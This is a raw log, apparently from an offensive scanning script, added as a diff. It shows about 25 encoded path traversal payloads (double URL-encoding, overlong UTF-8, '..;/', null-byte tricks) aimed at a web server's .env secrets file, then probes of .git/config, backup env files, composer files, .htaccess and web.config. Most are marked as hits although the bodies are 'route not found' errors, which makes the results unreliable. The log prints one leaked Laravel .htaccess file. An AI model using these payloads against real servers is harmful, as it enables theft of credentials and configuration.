@@ -1,0 +1,87 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 高级路径穿越 - 所有编码技巧
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[*] 测试 .env 文件...
+  /.env → ❌
+  /../.env → ❌
+  /../../.env → ❌
+  /../../../.env → ❌
+  /../../../../.env → ❌
+  /%2e%2e/.env → ❌
+  /%2e%2e%2f.env → ❌
+  /..%2f.env → ❌
+  /..%252f.env → ❌
+  /%252e%252e/.env → ❌
+  /%25252e%25252e/.env → ❌
+  /%c0%ae%c0%ae/.env → ❌
+  /%c0%2e%c0%2e/.env → ❌
+  /..;/.env → ❌
+  /;/..;/..;/.env → ❌
+  /static../.env → ❌
+  /.env%00 → ❌
+  /../.env%00.jpg → ❌
+  /api/v1/../../.env → ❌
+  /storage/logs/../../.env → ❌
+  /public/../.env → ❌
+  /..\..\..\..env → ❌
+  /./././.env → ❌
+  /.%2e/.env → ❌
+  /.../.env → ❌
+
+[*] 测试其他敏感文件...
+✅ /.env.backup → 200
+{"success":false,"message":"The route .env.backup could not be found.","code":1104,"errors":[]}━━━
+✅ ..;//.env.backup → 200
+{"success":false,"message":"The route ..;\/\/.env.backup could not be found.","code":1104,"errors":[]}━━━
+✅ /.env.example → 200
+{"success":false,"message":"The route .env.example could not be found.","code":1104,"errors":[]}━━━
+✅ ..;//.env.example → 200
+{"success":false,"message":"The route ..;\/\/.env.example could not be found.","code":1104,"errors":[]}━━━
+✅ /.env.old → 200
+{"success":false,"message":"The route .env.old could not be found.","code":1104,"errors":[]}━━━
+✅ ..;//.env.old → 200
+{"success":false,"message":"The route ..;\/\/.env.old could not be found.","code":1104,"errors":[]}━━━
+✅ /.git/config → 200
+{"success":false,"message":"The route .git\/config could not be found.","code":1104,"errors":[]}━━━
+✅ ..;//.git/config → 200
+{"success":false,"message":"The route ..;\/\/.git\/config could not be found.","code":1104,"errors":[]}━━━
+✅ /.git/HEAD → 200
+{"success":false,"message":"The route .git\/HEAD could not be found.","code":1104,"errors":[]}━━━
+✅ ..;//.git/HEAD → 200
+{"success":false,"message":"The route ..;\/\/.git\/HEAD could not be found.","code":1104,"errors":[]}━━━
+✅ /composer.json → 200
+{"success":false,"message":"The route composer.json could not be found.","code":1104,"errors":[]}━━━
+✅ ..;//composer.json → 200
+{"success":false,"message":"The route ..;\/\/composer.json could not be found.","code":1104,"errors":[]}━━━
+✅ /composer.lock → 200
+{"success":false,"message":"The route composer.lock could not be found.","code":1104,"errors":[]}━━━
+✅ ..;//composer.lock → 200
+{"success":false,"message":"The route ..;\/\/composer.lock could not be found.","code":1104,"errors":[]}━━━
+✅ /.htaccess → 200
+<IfModule mod_rewrite.c>
+    <IfModule mod_negotiation.c>
+        Options -MultiViews -Indexes
+    </IfModule>
+
+    RewriteEngine On
+
+    # Handle Authorization Header
+    RewriteCond %{HTTP:Authorization} .
+    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+
+    # Redirect Trailing Slashes If Not A Folder...
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_URI} (.+)/$
+    RewriteRule ^ %1 [L,R=301]
+
+    # Send Requests To Front Controller...
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteRule ^ index.php [L]
+━━━
+✅ ..;//.htaccess → 200
+{"success":false,"message":"The route ..;\/\/.htaccess could not be found.","code":1104,"errors":[]}━━━
+✅ /web.config → 200
+{"success":false,"message":"The route web.config could not be found.","code":1104,"errors":[]}━━━
+✅ ..;//web.config → 200
+{"success":false,"message":"The route ..;\/\/web.config could not be found.","code":1104,"errors":[]}━━━
